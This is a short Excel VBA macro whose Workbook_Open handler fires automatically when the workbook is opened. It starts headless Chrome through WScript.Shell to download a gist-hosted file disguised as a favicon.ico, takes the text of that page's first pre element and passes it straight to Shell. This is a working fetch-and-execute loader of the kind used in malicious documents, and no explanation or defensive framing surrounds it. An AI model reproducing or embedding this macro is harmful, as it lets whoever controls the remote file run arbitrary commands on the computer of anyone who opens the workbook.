Option Explicit

Private Sub Workbook_Open()

    Dim FileUrl As String
    FileUrl = "https://gist.githubusercontent.com/thisismyrobot/d048e1ba8c3e8b777eedb6b02ecd4b6d/raw/f56ae8b29241ee269cac3f2a42cf4a98a5324260/favicon.ico"
    
    Dim Response As String
    Response = CreateObject("WScript.Shell").Exec("""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --headless --disable-gpu --enable-logging --dump-dom " & FileUrl).StdOut.ReadAll

    Dim html As New HTMLDocument
    html.body.innerHTML = Response
        
    Dim command As String
    command = html.getElementsByTagName("pre")(0).innerText
    Call Shell(command)

End Sub
